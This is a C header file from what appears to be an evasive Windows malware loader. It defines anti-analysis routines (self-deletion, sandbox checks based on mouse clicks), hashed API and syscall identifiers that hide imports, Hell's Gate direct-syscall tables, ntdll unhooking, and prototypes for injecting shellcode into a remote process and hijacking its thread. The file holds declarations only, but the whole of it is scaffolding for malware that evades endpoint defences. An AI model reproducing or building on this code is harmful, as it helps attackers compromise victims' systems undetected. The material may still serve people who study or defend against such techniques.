/*
	header file that contains the function's prototypes and other needed values.
	In addition to the API_HASHING & VX_TABLE structures definitions

*/

#pragma once

#define WIN32_NO_STATUS
#include <windows.h>
#include <ntstatus.h>

#ifndef COMMON_H
#define COMMON_H

// contains the defintions of the WinAPIs used
#include "typedef.h"

//--------------------------------------------------------------------------------------------------------------------------
// from AntiAnalysis.c

// monitor mouse clicks for 20 seconds
#define MONITOR_TIME   20000 

// the new data stream name
#define NEW_STREAM L":MOLZRI3"

/*
	function that execute a group of Anti-Analysis functions :
		- Self Deletion
		- Monitoring User Interaction Of Mouse-Clicks
*/
BOOL AntiAnalysis(DWORD dwMilliSeconds);


//--------------------------------------------------------------------------------------------------------------------------
// 'hasher.exe' output - hash values of syscalls/winapis functions

#define NtQuerySystemInformation_JOAA			0x7B9816D6
#define NtCreateSection_JOAA					0x192C02CE
#define NtMapViewOfSection_JOAA					0x91436663
#define NtUnmapViewOfSection_JOAA				0x0A5B9402
#define NtClose_JOAA							0x369BD981
#define NtCreateThreadEx_JOAA					0x8EC0B84A
#define NtWaitForSingleObject_JOAA				0x6299AD3D
#define NtDelayExecution_JOAA					0xB947891A

#define NtSuspendThread_JOAA					0xF1F15196
#define NtGetContextThread_JOAA					0xD5511691
#define NtResumeThread_JOAA						0x13684121
#define NtSetContextThread_JOAA					0x58335AC7

#define NtAllocateVirtualMemory_JOAA			0x6E8AC28E
#define NtWriteVirtualMemory_JOAA				0x319F525A
#define NtProtectVirtualMemory_JOAA				0x1DA5BB2B

#define NtOpenThread_JOAA						0x1F9E9DDC	
#define NtOpenProcess_JOAA						0x837FAFFE

#define GetTickCount64_JOAA						0x00BB616E
#define OpenProcess_JOAA						0xAF03507E
#define CallNextHookEx_JOAA						0xB8B1ADC1
#define SetWindowsHookExW_JOAA					0x15580F7F
#define GetMessageW_JOAA						0xAD14A009
#define DefWindowProcW_JOAA						0xD96CEDDC
#define UnhookWindowsHookEx_JOAA				0x9D2856D0
#define GetModuleFileNameW_JOAA					0xAB3A6AA1
#define CreateFileW_JOAA						0xADD132CA
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define CloseHandle_JOAA						0x9E5456F2

#define SystemFunction032_JOAA					0x8CFD40A8

#define CreateToolhelp32Snapshot_JOAA			0xFE46E82A
#define Thread32First_JOAA						0xD38EA058
#define Thread32Next_JOAA						0xD5D85356


#define KERNEL32DLL_JOAA						0xFD2AD9BD
#define USER32DLL_JOAA							0x349D72E7

//--------------------------------------------------------------------------------------------------------------------------
// from WinApi.c

// seed of the HashStringJenkinsOneAtATime32BitA/W funtion in 'WinApi.c'
#define INITIAL_SEED	8

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

CHAR _toUpper(CHAR C);
PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size);

//--------------------------------------------------------------------------------------------------------------------------
// from ApiHashing.c

/*
	Api Hashing functions
*/
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash);

//--------------------------------------------------------------------------------------------------------------------------
// from HellsGate.c

typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	UINT32	uHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;


PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(_In_ PVOID pModuleBase, _Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(_In_ PVOID pModuleBase, _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, _In_ PVX_TABLE_ENTRY pVxTableEntry);


extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();


//--------------------------------------------------------------------------------------------------------------------------
// from inject.c

#define KEY_SIZE 16
#define HINT_BYTE 0xA6

// used to fetch the addresses of the syscalls / WinAPIs used
BOOL InitializeSyscalls();
// used to get the target process handle 
BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);
// used to inject the payload after decrypting it to the target process
//BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal);
BOOL GetRemoteThreadHandle(	IN  DWORD   dwProcessId,	OUT PDWORD  dwThreadId,OUT PHANDLE hThread);
BOOL InjectShellcodeToRemoteProcess(	IN  HANDLE  hProcess,	IN  PBYTE   pShellcode,	IN  SIZE_T  sSizeOfShellcode,	OUT PVOID* ppAddress);
BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress);
BOOL RemoteInjectAndHijack(IN  LPCWSTR szProcessName,IN  PBYTE   pShellcode,IN  SIZE_T  sShellcodeSize);
BOOL MapCleanNtdll();
WCHAR* DeobfuscateProcessName();

//--------------------------------------------------------------------------------------------------------------------------

// structure that will be used to save the WinAPIs addresses
typedef struct _API_HASHING {

	fnGetTickCount64				pGetTickCount64;
	fnOpenProcess					pOpenProcess;
	fnCallNextHookEx				pCallNextHookEx;
	fnSetWindowsHookExW				pSetWindowsHookExW;
	fnGetMessageW					pGetMessageW;
	fnDefWindowProcW				pDefWindowProcW;
	fnUnhookWindowsHookEx			pUnhookWindowsHookEx;
	fnGetModuleFileNameW			pGetModuleFileNameW;
	fnCreateFileW					pCreateFileW;
	fnSetFileInformationByHandle	pSetFileInformationByHandle;
	fnCloseHandle					pCloseHandle;
	fnCreateToolhelp32Snapshot		pCreateToolhelp32Snapshot;
	fnThread32First					pThread32First;
	fnThread32Next					pThread32Next;

}API_HASHING, * PAPI_HASHING;


// structure that will be used to save the Syscalls Information (ssn - hash - address)
typedef struct _VX_TABLE {

	VX_TABLE_ENTRY NtQuerySystemInformation;


	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
	VX_TABLE_ENTRY NtSuspendThread;
	VX_TABLE_ENTRY NtGetContextThread;
	VX_TABLE_ENTRY NtResumeThread;
	VX_TABLE_ENTRY NtSetContextThread;
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtWriteVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtOpenThread;
	VX_TABLE_ENTRY NtOpenProcess;


	VX_TABLE_ENTRY NtDelayExecution;

} VX_TABLE, * PVX_TABLE;



#endif // !COMMON_H
